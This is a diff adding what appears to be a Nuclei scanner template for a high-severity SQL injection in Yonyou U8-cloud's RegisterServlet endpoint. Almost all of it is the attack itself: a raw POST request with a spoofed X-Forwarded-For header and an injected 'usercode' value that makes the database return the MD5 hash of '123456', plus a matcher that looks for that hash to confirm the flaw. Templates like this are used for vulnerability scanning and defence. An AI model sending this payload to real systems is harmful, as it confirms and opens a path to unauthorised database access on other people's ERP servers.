@@ -1,0 +1,25 @@
+id: YongYouU8-cloud-RegisterServlet-sqli
+
+info:
+  name: 用友u8-cloud RegisterServlet SQL注入漏洞
+  author: 帝国绝凶虎の理塘纯真丁一郎
+  severity: high
+
+variables:
+  
+
+http:
+  - raw:
+      - |
+          POST /servlet/RegisterServlet HTTP/1.1
+          Host: {{Hostname}}
+          X-Forwarded-For: 127.0.0.1
+          Content-Type: application/x-www-form-urlencoded
+
+          usercode=1'%20and%20substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32)>0--
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body, "e10adc3949ba59abbe56e057f20f883e")'
